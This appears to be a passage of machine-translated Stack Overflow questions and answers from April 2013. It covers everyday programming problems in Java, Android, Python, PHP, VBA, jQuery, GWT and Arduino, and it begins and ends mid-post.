这样做，通过 ajax 动态加载的内容不会中断，并且应用程序可以正常运行。我希望这会对某人有所帮助！！！

# ios - Tabris 0.11 iOS EXC_BAD_ACCESS 地理位置

> ID：16215872
> 
> 赞同：0
> 
> 时间：2013-04-25T13:18:56.827
> 
> 标签：ios, geolocation, exc-bad-access, tabris

首先：感谢几天前我从你们那里得到了如此好的和快速的反馈。

我仍在使用 Tabris 0.11 并尝试像你们在演示项目中那样实现地理定位。

在 Android 上一切正常，但在 iOS（iPhone 5）下我得到了错误

```
EXC_BAD_ACCESS (code=1, address=0xbbadbeef) 
```

这是我的代码的样子

```
public void create( Composite parent, UIContext context ) {
    // creation of the layout types
    createLayouts();
    parent.setLayout( GridLayoutFactory.fillDefaults().margins( 0, 0 ).spacing( 0, 0 ).create() );
    createContainer( parent );
    createBrowser();     
  }

private void createLayouts() {
    layoutGrid = new GridLayout();
    layoutGrid.numColumns = 1;
    layoutGridData = new GridData();
    layoutGridData.horizontalAlignment = GridData.FILL;
}

 private void createContainer( Composite parent ) {
    [...]
    containerBrowser = new Composite( parent, SWT.NONE );
    containerBrowser.setLayout( layoutGrid );
    containerBrowser.setLayoutData( new GridData( SWT.FILL, SWT.FILL, true, true ) );
    [...]
  }

  private void createBrowser() {
     browser = new Browser( containerBrowser, SWT.NONE );
     browser.setLayoutData( new GridData( SWT.FILL, SWT.FILL, true, true ) );
     lastLat = 48.775418;
     lastLon = 9.181759;
     setBrowserUrl( lastLat, lastLon);
  }

  private void setBrowserUrl( double lat, double lon) {
     StringBuilder builder = new StringBuilder();
     builder.append( "http://open.mapquestapi.com/staticmap/v4/getmap" );
     builder.append( "?size=" + 200 + "," + 200 );
     builder.append( "&zoom=16" );
     lastLat = lat;
     lastLon = lon;
     builder.append( "&center=" + lat + "," + lon );
     builder.append( "&imageType=png" );
     if( lastLabel != null ) {
       builder.append( "&pois=" + lastLabel + "," + lat + "," + lon + ",0,0" );
     }
     browser.setUrl( builder.toString() );
  } 
```

我在iOS方面没有真正的经验，希望这些信息对你们有所帮助。

在此先感谢，托比

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-29T07:56:08.047

使用您提供的示例，我无法重现该问题。也许您看到的是预发布版 Tabris 0.11 客户端中的一个问题。该问题可能已在最终的 Tabris 1.0 版本中得到修复。

我建议你下载 Tabris 1.0 ( [http://developer.eclipsesource.com/tabris/downloads/](http://developer.eclipsesource.com/tabris/downloads/) ) 然后再试一次。

如果您仍有问题，请使用“Xcode Organizer”将崩溃应用程序的“设备日志”发送给我。

# java - 如何使用 JSR 303 @Valid 注解来验证原始类型？

> ID：16215877
> 
> 赞同：4
> 
> 时间：2013-04-25T13:19:00.980
> 
> 标签：java, spring-mvc, validation

JSR 303 @Valid 注解可用于验证控制器方法的输入对象，如[Mkyong.com 上所示](http://www.mkyong.com/spring-mvc/spring-3-mvc-and-jsr303-valid-example/)

是否可以使用@Valid 注解来验证 int 和 long[] 等原始类型？如果是这样，怎么做？

这是一个示例 Spring MVC 方法签名，需要验证参数是否高于 0：

```
@RequestMapping(value = { "/delete" }, method = RequestMethod.POST)
ModelAndView deleteBulk(@RequestParam("userId") int userId, @RequestParam("ids") long[] ids) { 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-18T07:06:49.457

不，这做不到。它用于*bean*验证，如此[处](http://jcp.org/en/jsr/detail?id=303#2 "这里")所述。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-04-14T08:02:59.733

您可以验证 @RequestParam/@PathVariable 简单对象和原语，如果将**@Validated 放在完整控制器上**。

而且如果你不使用spring-boot，你应该自己声明MethodValidationPostProcessor

```
@Bean
public MethodValidationPostProcessor methodValidationPostProcessor() {
    return new MethodValidationPostProcessor();
} 
```

# jms - 设置 JMS 过滤器（范围过滤器）

> ID：16215888
> 
> 赞同：0
> 
> 时间：2013-04-25T13:19:35.993
> 
> 标签：jms, hornetq

**我在生产者端设置 JMS 过滤器，即 jmsMessage.setObjectProperty("FILTER",filterId1) ...

所以这是一对一的关系。即键 FILTER 仅与一个值相关联，即 filterId1 （ msg 由值为 filterid1 的消费者使用）....

但我想要一对多的关系，即。FILTER 与许多 filterId 相关联（filterId1 或 filterId2 或 filterId3 或 filterId4 或 filterId5 ）具有任何这些 filterId 之间的值的消费者可以消费消息.....

如果没有 jms 中的任何功能，那么我们如何以编程方式实现它.....**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T16:33:25.950

您可以在过滤器上使用 Between，但我怀疑您可能应该为您的集合使用不同的队列。如果您有许多要扫描的邮件，过度使用过滤器会给您带来不好的性能。

我更喜欢带有过滤器的订阅，或者只是为您需要的东西使用多个队列。

但这不仅仅是简单地回答你的问题，一个简单的答案是在你的消费者的过滤子句上使用 BETWEEN 。

（另外：生产者中没有 JMS 过滤器之类的东西。过滤器仅适用于消费者。我假设您的意思是设置一些将在过滤器上使用的数据）。

# arrays - Excel VBA - 使用数组的子组

> ID：16215892
> 
> 赞同：0
> 
> 时间：2013-04-25T13:19:45.683
> 
> 标签：arrays, loops, excel, vba

我有一个包含 1000 个条目的一维数组。我想遍历这个数组的一部分并应用计算该子组的平均值。到目前为止我所做的看起来像这样：

```
 Temp = Array(myArray)

        Temp_Range = Application.Index(Temp, Evaluate("Row(1:10)"))

        Average(i) = Application.Average(Temp_Range) 
```

通过这个我可以计算前 10 行的平均值。然而，这根本不是动态的，我想知道是否有另一种方法来处理这个数组的子组（这样我最终可以循环遍历它们）？

谢谢你的帮助，我只是无法弄清楚这个......

**更新：** 我在这里用 St.Dev 尝试了你的代码（不是平均的）。有用！非常感谢。但是，代码真的很慢。有没有办法让它更快？

这里的循环： Return 是一个包含 1000 个返回值的数组。我的目标是计算一年的每日回报数据的标准差。

```
 For i = 2 To n

    If Year(Dates(i)) > Year(Dates(i - 1)) Then

        Test = Application.Index(Return, Evaluate("Row(" & C & ":" & (i - 2) & ")"))

        Vola(M) = Application.StDev(Test) * Sqr(252)

        M = M + 1
        C = i - 1

    Else

        Test = Application.Index(Return, Evaluate("Row(" & C & ":" & (i - 1) & ")"))

        On Error Resume Next
        Vola(M) = Application.StDev(Test) * Sqr(252)

    End If

Next i 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:22:15.473

在不知道*如何*循环这些内容的情况下，您可以：

```
Dim frstRow as Long, lstRow as Long

'within your loop, assign the values to frstRow, lstRow

Temp_Range = Application.Index(Temp, Evaluate("Row(" & frstRow & ":" & lstRow &")")) 
```

# android - 循环和其他方面的 JSON 解析错误

> ID：16215903
> 
> 赞同：0
> 
> 时间：2013-04-25T13:20:13.563
> 
> 标签：android, json

我很难解析以下 JSON 输出：

```
{
   "status":"success",
   "data":[
      {
         "question_id":"1",
         "category_id":"1",
         "question":"jjj",
         "answer":"ffdf",
         "created_on":"16 Apr, 2013 06:52",
         "modified_on":"",
         "user_id":"1",
         "category_name":"Career",
         "is_answered":true
      },
      {
         "question_id":"3",
         "category_id":"1",
         "question":"ssssssssssss",
         "answer":null,
         "created_on":"23 Apr, 2013 15:12",
         "modified_on":"",
         "user_id":"1",
         "category_name":"Career",
         "is_answered":false
      }
   ],
   "message":null
} 
```

我尝试过的代码是：

```
JSONObject getQuestion;
public class GetQuestionAnswers extends AsyncTask<Void, Void, Void> {
    ProgressDialog progress;

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        progress = new ProgressDialog(QuestionStack.this);
        progress.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progress.setMessage("Updating Information ...");
        progress.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        UserFunctions users = new UserFunctions();
        getQuestion = users.getAllQuestion(question_user_id);
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {
        try {
            JSONArray data = getQuestion.getJSONArray("data");
            Log.i("DATA", data.toString());
            for (int i = 0; i < data.length(); i++) {
                JSONObject goAccess = data.getJSONObject(i);
                question_JSON = goAccess.getString("question");
                answer_JSON = goAccess.getString("answer");
                Log.i("QUESTION", question_JSON);
                Log.i("ANSWER", answer_JSON);
                question_answer_view.setText(question_JSON + answer_JSON);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        progress.dismiss();
        super.onPostExecute(result);
    }
} 
```

它显示的错误：

```
04-25 18:54:26.234: W/System.err(2945):     at org.json.JSON.typeMismatch(JSON.java:100)
04-25 18:54:26.234: W/System.err(2945):     at org.json.JSONObject.getJSONArray(JSONObject.java:548)
04-25 18:54:26.244: W/System.err(2945):     at com.example.btshome.QuestionStack$GetQuestionAnswers.onPostExecute(QuestionStack.java:80)
04-25 18:54:26.244: W/System.err(2945):     at com.example.btshome.QuestionStack$GetQuestionAnswers.onPostExecute(QuestionStack.java:1)
04-25 18:54:26.244: W/System.err(2945):     at android.os.AsyncTask.finish(AsyncTask.java:631)
04-25 18:54:26.244: W/System.err(2945):     at android.os.AsyncTask.access$600(AsyncTask.java:177)
04-25 18:54:26.264: W/System.err(2945):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:644)
04-25 18:54:26.304: W/System.err(2945):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-25 18:54:26.304: W/System.err(2945):     at android.os.Looper.loop(Looper.java:137)
04-25 18:54:26.304: W/System.err(2945):     at android.app.ActivityThread.main(ActivityThread.java:4745)
04-25 18:54:26.304: W/System.err(2945):     at java.lang.reflect.Method.invokeNative(Native Method)
04-25 18:54:26.314: W/System.err(2945):     at java.lang.reflect.Method.invoke(Method.java:511)
04-25 18:54:26.314: W/System.err(2945):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
04-25 18:54:26.334: W/System.err(2945):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
04-25 18:54:26.334: W/System.err(2945):     at dalvik.system.NativeStart.main(Native Method) 
```

这段代码的主要目的是为我的文本视图加载一组问题和答案，我显然没有实现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:30:33.403

```
Try this...

    JSONObject js = new JSONObject(jsonString);
    for (int i = 0; i < js.length(); i++) {
        JSONArray data = js.getJSONArray("data");
        for (int j = 0; j < data.length(); j++) {
        JSONObject goAccess = data.getJSONObject(j);
        String question_JSON = goAccess.getString("question");
        String answer_JSON = goAccess.getString("answer");
            if(question_JSON ==null)
                question_JSON = "";
            if(answer_JSON==null)
                answer_JSON  = "";
        Log.i("QUESTION", question_JSON);
        Log.i("ANSWER", answer_JSON);
        question_answer_view.setText(question_JSON + answer_JSON);
        }

    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:34:31.730

也许你可以试试这个（如果`getQuestion`你的结果字符串包含 JSON Obejct），在循环后返回一个字符串中的所有问题/答案：

```
JSONObject getQuestion;
public class GetQuestionAnswers extends AsyncTask<Void, Void, String> {
    ProgressDialog progress;

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        progress = new ProgressDialog(QuestionStack.this);
        progress.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progress.setMessage("Updating Information ...");
        progress.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        UserFunctions users = new UserFunctions();
        getQuestion = users.getAllQuestion(question_user_id);
        return getQuestion;
    }

    @Override
    protected void onPostExecute(String result) {
        JSONObject resultObject = new JSONObject(result); 

        try {
            JSONArray data = resultObject.getJSONArray("data");
            Log.i("DATA", data.toString());
            String result = "";
            for (int i = 0; i < data.length(); i++) {
                JSONObject goAccess = data.getJSONObject(i);
                question_JSON = goAccess.getString("question");
                answer_JSON = goAccess.getString("answer");
                Log.i("QUESTION", question_JSON);
                Log.i("ANSWER", answer_JSON);
                result += question_JSON + answer_JSON;
            }
            question_answer_view.setText(result);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        progress.dismiss();
        super.onPostExecute(result);
    }
} 
```

# python - python tkinter：下拉时自定义菜单

> ID：16215910
> 
> 赞同：0
> 
> 时间：2013-04-25T13:20:34.803
> 
> 标签：python, menu, tkinter

我正在学习使用 Python 和 Tkinter 创建软件。现在我需要根据不同的条件更改菜单项，但找不到简单的方法。好吧，让我试着用一个例子清楚地解释我的问题：

![在此处输入图像描述](https://i.stack.imgur.com/8CJ7C.jpg)

如图所示，我在左侧有一个列表框，在右侧有一个列表框。我还有一个移动项目的菜单，命令是“向右移动”、“向左移动”和“交换”。考虑以下条件：

1.  当我只在左侧列表框中选择项目时，我只希望启用“向右移动”命令，如图所示。
2.  当我只在右侧列表框中选择项目时，我只希望启用“向左移动”命令。
3.  当我在两个列表框中选择项目时，我希望启用所有命令。
4.  当我没有选择任何项目时，我希望禁用所有命令。

我知道我可以通过将事件“ListboxSelect”和“Button-1”绑定到某些函数来完成工作，然后使用这些函数来配置菜单。但是当我在实际软件中有五个列表框时，这确实是一项复杂的工作。所以我想知道是否有一种简单的方法可以做到这一点，比如重载 tkinter.Menu 类中的一些函数（我尝试重载 post()、grid()、pack() 和 place()，它们都不起作用）。

欢迎任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:51:43.243

我认为您要使用的是根据`postcommand`需要修改菜单。如果您将有多个列表框，最简单的解决方案可能是实现您自己的类。这是一个粗略的想法：

```
class EditMenu(Tkinter.Menu):

    def __init__(self, parent, listboxes, **kw):
        self.commandhook = kw.get('postcommand', None)
        kw['postcommand'] = self.postcommand
        super(EditMenu, self).__init__(parent, **kw)
        self.listboxes = listboxes
        self.add_command(label="Move to right", command=self.move_to_right)
        self.add_command(label="Move to left", command=self.move_to_left)
        self.add_command(label="Exchange", command=self.exchange)

    def postcommand(self):
        for i in xrange(3):
            # do some checks for each entry
            # and set state to either Tkinter.DISABLED or Tkinter.NORMAL
            self.entryconfig(i, state=state)
        if self.commandhook is not None:
            self.commandhook()

    # Implement your three functions here 
```

如果您开始添加更多项目，您可能想要为每个菜单项创建一个类。在该类中，您可以输入启用/禁用逻辑和回调函数实现。如果您想查看示例，请发表评论。

# jquery - 在 MVC 页面中添加 jQueryUI 脚本的位置

> ID：16215912
> 
> 赞同：2
> 
> 时间：2013-04-25T13:20:37.423
> 
> 标签：jquery, asp.net, asp.net-mvc, jquery-ui

我正在使用 EditorTemplates 文件夹和以下 DateTime.cshtml 将日期选择器 (jQuery UI) 添加到所有 Datetime 字段：

```
@model Nullable<System.DateTime>
@if ( Model.HasValue ) {
@Html.TextBox( "" , String.Format( "{0:yyyy-MM-dd HH:mm}" , Model.Value ) , new  {     @class = "textbox" , @style = "width:400px;" } )
}
else {
@Html.TextBox( "" , String.Format( "{0:yyyy-MM-dd HH:mm}" , DateTime.Now ) , new {     @class = "textbox" , @style = "width:400px;" } )
}

@{
string name = ViewData.TemplateInfo.HtmlFieldPrefix;
string id = name.Replace( ".", "_" );
}
<script type="text/javascript">
$(document).ready(function () {
    alert("adding date picker");
    $("#@id").datepicker
        ({
            dateFormat: 'dd/mm/yy',
            showStatus: true,
            showWeeks: true,
            highlightWeek: true,
            numberOfMonths: 1,
            showAnim: "scale",
            showOptions: {
                origin: ["top", "left"]
            }
        });
});
</script> 
```

但是，如果我将 jQuery 脚本等添加到页面底部，建议现在是最佳实践 - 上面的代码显示为内联 - 在 jQuery 脚本上方 - 因此不会运行：

主 CSHTML Razor 视图：

```
 @RenderBody()   
        <hr>
        <footer>
            <p>&copy; Company @System.DateTime.Now.ToString("yyyy")</p>
        </footer> 
    </div>
     @Scripts.Render("~/js")
     @Scripts.Render("~/jqueryui")
     @RenderSection("Scripts", required: false)
</body> 
```

我应该绕过最佳实践并将 jQuery 脚本添加到页面顶部 - 还是有更简单的方法可以使这项工作，同时仍然遵循最佳实践？

谢谢，

标记

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:23:08.713

你应该把它放在以下部分：

```
@section Scripts { 

    <script type="text/javascript">
$(document).ready(function () {
    alert("adding date picker");
    $("#@id").datepicker
        ({
            dateFormat: 'dd/mm/yy',
            showStatus: true,
            showWeeks: true,
            highlightWeek: true,
            numberOfMonths: 1,
            showAnim: "scale",
            showOptions: {
                origin: ["top", "left"]
            }
        });
});
</script>
} 
```

这样，您的脚本将添加到 jQuery 声明下方

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:25:15.813

您的视图或部分中不应包含任何脚本。脚本应该放在它们所属的地方 - 在单独的 javascript 文件中。

因此，您可以拥有一个启用日期选择器的 javascript 文件，例如`~/scripts/myscript.js`：

```
$('.datepicker').datepicker({
    dateFormat: 'dd/mm/yy',
    showStatus: true,
    showWeeks: true,
    highlightWeek: true,
    numberOfMonths: 1,
    showAnim: "scale",
    showOptions: {
        origin: ["top", "left"]
    }
}); 
```

如您所见，我在这里使用了一个类选择器：`$('.datepicker')`为了将 datepicker 插件附加到所有具有`class="datepicker"`.

现在剩下的就是覆盖视图中的脚本自定义部分（而不是在部分或模板中）：

```
@section Scripts {
    <script type="text/javascript" src="~/scripts/myscript.js"></script>
} 
```

现在您的模板将仅包含模板应包含的内容 - 标记：

```
@model DateTime?
@Html.TextBox(
    "", 
    string.Format("{0:yyyy-MM-dd HH:mm}", Model ?? DateTime.Now), 
    new { 
        @class = "textbox datepicker", 
        @style = "width:400px;" 
    } 
) 
```

您可能还会注意到代码的简化。

现在，由于您遵循最佳实践将所有脚本放在单独的文件中，您甚至可以为它们打包：

```
@section Scripts {
    @Scripts.Render("~/datepickers")
} 
```

或者简单地将它包含在布局中的一些包中，以便它被缩小并与它们一起缓存并可供所有页面使用。

# php - 检查数组并识别匹配的数字

> ID：16215913
> 
> 赞同：1
> 
> 时间：2013-04-25T13:20:37.347
> 
> 标签：php, arrays, random

我正在开发一个刮刮卡游戏，用户从我/我的商店购买刮刮卡，然后可以通过刮掉数字并匹配 3 张图片来兑换该卡以赢取奖品

就像实体刮刮卡一样，我希望预先配置好奖品，以便我知道什么时候会中奖，但显然用户不知道，这样我就可以限制奖品，所以它不是真正的随机，而是随机谁中奖的条款..

我知道我将如何设置奖品，但我需要检查数组中的每个数据值以确保没有 3 个匹配的数字，除非他们真的赢了..

到目前为止我有这个（我会整理它并很快缩短代码）

```
$numbers = array(
    0 => rand(0,9),
    1 => rand(0,9),
    2 => rand(0,9),
    3 => rand(0,9),
    4 => rand(0,9),
    5 => rand(0,9),
    6 => rand(0,9),
    7 => rand(0,9),
    8 => rand(0,9)
    ); 
```

它只是随机生成 9 个数字和

```
echo "<table>";
    $i=0;
    for($x=0;$x<3;$x++){
    echo "<tr>";
       for($y=0;$y<3;$y++){
           echo "<td>" . $numbers[$i] . "</td>";
           $i++;
       }
    echo "</tr>";
    } 
```

将它们排序为 3x3 表

我知道有命令 in_array() 将通过数组进行排序以查找某些值，但我不想运行一个无限循环检查每个值以查看是否匹配，因为它是劳动密集型的并且也会很混乱。

我正在寻找任何人可能有的建议，这样我就可以对数组进行排序，看看是否存在任何 3 个数字，如果存在，并且他们不应该（即用户实际上没有中奖）然后一个应更改为新号码。

所以提前感谢您的帮助，我期待您的建议

卢克

****** *** ***编辑***** *****

 **+更多信息

为了挑选获胜者，我将使用这样的数据库查询

```
$stock = $conn -> query("SELECT DISTINCT * FROM codes WHERE Available = 1 AND 0 = FLOOR(RAND()*Chance) ORDER BY RAND()"); 
```

每个代码都有一定的获胜机会，如果匹配，则会显示，根据赢得的代码，将显示特定的奖品

```
$stock = $conn -> query("SELECT DISTINCT * FROM codes WHERE Available = 1 AND Win = 1); 
```

'Win' 将是数据库中的一个表，每次有人玩游戏时它都会下降 1

所以每个代码都会有表格 Win 当它达到 1 时它将在下一场比赛中弹出

这是我能想到的两种我认为可行的方法，这两种方法都可以让我大致控制何时以及是否有人获胜，但第二种解决方案显然是一种更准确的方法

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:27:14.483

如果发生三一，但防止三一发生，如何不更改数字。

```
function createScratchRange()
{
    $result = array();
    $options = array_merge(range(0,9), range(0,9));

    for ($i = 0; $i < 9; $i++)
    {
        $key =  array_rand($options, 1);
        $result[] = $options[$key];
        unset($options[$key]);
    }

    return $result;
} 
```

您可能希望能够创造赢家：

```
function createWinner()
{
    $winningNumber = rand(0,9);

    $result = array();
    $possibleNumbers = range(0,9);
    unset($possibleNumbers[$winningNumber]);
    $options = array_merge($possibleNumbers,$possibleNumbers);

    for ($i = 0; $i < 9; $i++)
    {
        $key =  array_rand($options, 1);
        $result[] = $options[$key];
        unset($options[$key]);
    }

    // looks random now.. but no winning numbers... Lets just stick them in there.
    $keys = array_rand($result, 3);
    foreach($keys as $key)
    {
        $result[$key] = $winningNumber;
    }

    return $result;
} 
```

并用于测试：

```
var_dump(createScratchRange());  // this will never give 3 identical numbers in the array.
var_dump(createWinner());  // this will ALWAYS give 3 identical numbers, but never 2 sets of 3 identical numbers 
```**

# arduino - 用于原型螺线管项目的 Arduino Leonardo 或 Uno ？

> ID：16215918
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:20:59.130
> 
> 标签：arduino, microcontroller

我是一名没有嵌入式编程经验的软件开发人员。我必须开发一个原型项目：（示例）生成摩尔斯电码脉冲，这些脉冲将通过螺线管以振动的形式输出。我发现 Arduino Nano 或 Micro 都可以完成这项工作。虽然我选择了 Uno 作为项目，但考虑到以后的需求会不断发展。

我发现 Leonardo 和 Uno 是两个接近的变体。我根据我所做的一些研究选择了 Uno。主要是因为莱昂纳多的一些问题和/或特性，我了解到莱昂纳多对初学者来说不是一个好的选择。Uno 作为一个经验丰富的变体，也有更多的帮助。

如果我能对此发表一些意见，那就太好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T05:42:24.883

正如你和[Keshav Saharia](https://stackoverflow.com/questions/16215918/arduino-leonardo-or-uno-for-a-pototype-solenoid-project#comment23206790_16215918)所说，假设 Uno 和 Leonardo 的能力都满足你的需求，选择 Uno 的原因是因为它更老、更成熟、支持更好。例如，这里和[EE.SE](http://electronics.stackexchange.com)上的大多数 Arduino 帖子要么基于 Uno，要么与 Uno 兼容。同样，大多数 Arduino 指南都可以与 Uno 一起使用，但不一定与 Leonardo 一起使用。莱昂纳多总是那些脚注之一：如果你有莱昂纳多，你需要做*另一件事*。

此外，如果在某个时候，您决定放弃 Arduino 并使用裸 ATmega 芯片 ATmega328，那么 Uno 中的 MPU 是您可能使用的，也是人们熟悉的。Leonardo 使用了一种不同的 AVR 芯片 ATmega32u4，它与 Leonardo 一样，并没有那么受欢迎（普及？）。就我而言，这些都是选择 Uno 的好理由。

另一方面，如果您希望自己保留原型板，则可能需要考虑 Leonardo，因为它更强大：更多 IO、第二个硬件串行端口等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-26T13:48:01.500

你已经问过这个问题并且已经[回答](https://stackoverflow.com/a/16096154/840992)了。您认为 Arduino Nano 或 Micro 无法完成这项工作的结论是错误的。任何版本的 Arduino 都可以使用，任何其他微控制器（Basic Stamp、Picaxe 等）也可以使用。控制螺线管所需要做的就是将数字引脚从低电平变为高电平。由于螺线管电源要求，您**将需要一些外部电路，但电路很简单。**

# html - 每当调用 textbox.setText() 时应触发的 GWT 事件

> ID：16215920
> 
> 赞同：0
> 
> 时间：2013-04-25T13:21:01.773
> 
> 标签：html, gwt

我正在使用 GWT 文本框。

每当调用 textbox.setText() 方法时，我都想在其他类中执行一个操作。

每当调用 setText() 时，都不会触发 ValueChangeEvent。

是否有任何事件会被触发或有任何方法来实现这一点？

请帮忙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:41:24.383

您可以尝试使用[setValue(String value, boolean fireEvent) 方法](http://google-web-toolkit.googlecode.com/svn/javadoc/2.5/com/google/gwt/user/client/ui/ValueBoxBase.html#setValue%28T,%20boolean%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:38:40.607

如果您查看该`TextBox.seText()`方法，您会发现，一直到实际的 DOM，都不会生成任何事件，因此您想要做的事情根本无法开箱即用。

我看到两个选项：

1.  每当*您*调用 setText 时，您也会调用您选择的事件处理程序，或者更好
2.  制作您自己的扩展 TextBox 的 TextBox，并覆盖 setText() 方法，以便它首先调用 super.setText()，*然后*执行您想要的任何事件生成

# python - 如何使用用户输入来结束程序？

> ID：16215922
> 
> 赞同：5
> 
> 时间：2013-04-25T13:21:04.663
> 
> 标签：python, if-statement, python-3.x

我是 python 新手，我正在编写一个将毫米转换为英寸的程序。基本上，它是一个连续循环，可让您不断输入数字并获得正确的转换测量值。我想放一个 IF 语句，允许用户键入“end”来结束程序，而不是转换更多的测量单位。我将如何进行这项工作（哪些 python 代码允许您退出编写的程序并可以在 IF 语句中使用。）？

```
convert=float(25.4)
while True:
    print("*******MM*******")
    MM=float(input())
    Results=float(MM/convert)
    print("*****Inches*****")
    print("%.3f" % Results)
    print("%.4f" % Results)
    print("%.5f" % Results) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:30:04.957

要结束循环，您可以使用`break`语句。这可以在`if`语句中使用，因为`break`只查看循环，而不是条件。所以：

```
if user_input == "end":
    break 
```

注意我是怎么用`user_input`的，不是`MM`吗？那是因为您的代码现在有一个小问题：您在检查用户键入的内容之前调用了 float()。这意味着如果他们键入“end”，您将调用 float("end") 并获得异常。将您的代码更改为以下内容：

```
user_input = input()
if user_input == "end":
    break
MM = float(user_input)
# Do your calculations and print your results 
```

您还可以进行一项改进：如果您希望用户能够键入“END”或“End”或“end”，您可以使用 lower() 方法将输入转换为小写，然后再进行比较：

```
user_input = input()
if user_input.lower() == "end":
    break
MM = float(user_input)
# Do your calculations and print your results 
```

进行所有这些更改，您的程序将按照您希望的方式运行。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T13:29:09.800

只需[`iter`](http://docs.python.org/3.3/library/functions.html#iter)与哨兵一起使用：

```
print ("Convert MM to Inches")
convert=float(25.4)
for i in iter(input, 'end'):
    print("*******MM*******")
    try:
        MM=float(i)
    except ValueError:
        print("can't convert {}".format(i)) 
    else:
        Results=float(MM/convert)
        print("*****Inches*****")
        print("%.3f" % Results)
        print("%.4f" % Results)
        print("%.5f" % Results) 
```

这样，[`iter`](http://docs.python.org/3.3/library/functions.html#iter)调用[`input`](http://docs.python.org/3.3/library/functions.html#input)它的返回值并将其存储在`i`until中`i == 'end'`。

请注意，您可能需要一些错误检查，以防用户输入如上例中的非数字值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:26:50.013

要结束循环，您可以使用[`break`statement](http://docs.python.org/3.2/tutorial/controlflow.html#break-and-continue-statements-and-else-clauses-on-loops)。如果发行不可兑换价值，您还可以利用[`ValueError`](http://docs.python.org/3.2/library/exceptions.html#ValueError)所[引发](http://docs.python.org/3.2/tutorial/errors.html#handling-exceptions)的事实：

```
print ("Convert MM to Inches")
convert=float(25.4)
while True:
    print("*******MM*******")
    MM=input()
    try:
        MM = float(MM)
    except ValueError:
        break

    Results=float(MM/convert)
    print("*****Inches*****")
    print("%.3f" % Results)
    print("%.4f" % Results)
    print("%.5f" % Results) 
```

结果：

```
[vyktor@grepfruit tmp]$ ./convert 
Convert MM to Inches
*******MM*******
exit
[vyktor@grepfruit tmp]$ 
```

* * *

或者，如果您只想在字符串上退出`exit`并在发生错误时转到下一个循环，那么好的方法是：

```
MM = input()
if MM == 'exit':
    break

try:
    MM = float(MM)
except ValueError:
    print( 'I\'m sorry {} isn\'t a valid value'.format(MM))
    continue # Next iteration 
```

* * *

或者你可以让它*“linuxy”*你可以等到[`Ctrl+C`（键盘中断）](http://docs.python.org/3.2/library/exceptions.html#KeyboardInterrupt)被按下并优雅地处理它：

```
try:
    # Whole program goes here
except KeyboardInterrupt:
    print('Bye bye') 
```

这将是这样的（`^C`意味着发送`Ctrl+C`）：

```
[vyktor@grepfruit tmp]$ ./convert 
Convert MM to Inches
*******MM*******
^CBye bye 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-25T13:22:23.423

您可以使用`break`来跳出循环。

```
MM=input()
if MM == "end":
    break 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-25T13:26:05.993

在用户输入之后进行测试`MM`可以工作。您使用关键字`break`来跳出循环。你的例子，在小的添加之后如下。

```
print ("Convert MM to Inches")
convert=float(25.4)
while True:
    print("*******MM*******")
    MM=input()
    if MM == 'end':
        break
    Results=float(MM)/convert
    print("*****Inches*****")
    print("%.3f" % Results)
    print("%.4f" % Results)
    print("%.5f" % Results) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-25T13:24:52.883

```
import os
print ("Convert MM to Inches")
convert=float(25.4)
while True:
    print("*******MM*******")
    MM=input()
    if MM.lower() in ('end', 'quit'):
        os._exit(1)
    MM = float(MM)
    Results=float(MM/convert)
    print("*****Inches*****")
    print("%.3f" % Results)
    print("%.4f" % Results)
    print("%.5f" % Results) 
```

或者

```
print ("Convert MM to Inches")
convert=float(25.4)
while True:
    print("*******MM*******")
    MM=input()
    if MM.lower() in ('end', 'quit'):
        break
    MM = float(MM)
    Results=float(MM/convert)
    print("*****Inches*****")
    print("%.3f" % Results)
    print("%.4f" % Results)
    print("%.5f" % Results) 
```

# ios - MFMailComposeViewController 在设备上不起作用，控制台输出上打印的实例是

> ID：16215924
> 
> 赞同：1
> 
> 时间：2013-04-25T13:21:12.550
> 
> 标签：ios, objective-c, mfmailcomposeviewcontroller

我创建了这个名为 MailComposeViewController 的实用程序类，我正在从其他视图控制器中调用这个类，邮件 Composer 在模拟器上正常工作，但在设备上崩溃。

这样我调用函数

```
 NSLog(@"Mail");
    MailComposeViewController *mailComposer =[[MailComposeViewController alloc]init];
    [mailComposer showPicker:self andImage:md.Img_savedImageAfterEffect]; 
```

下面是我的实用程序类，其中包含发送邮件功能的代码

```
 #import "MailComposeViewController.h"

      UIViewController *Controller;
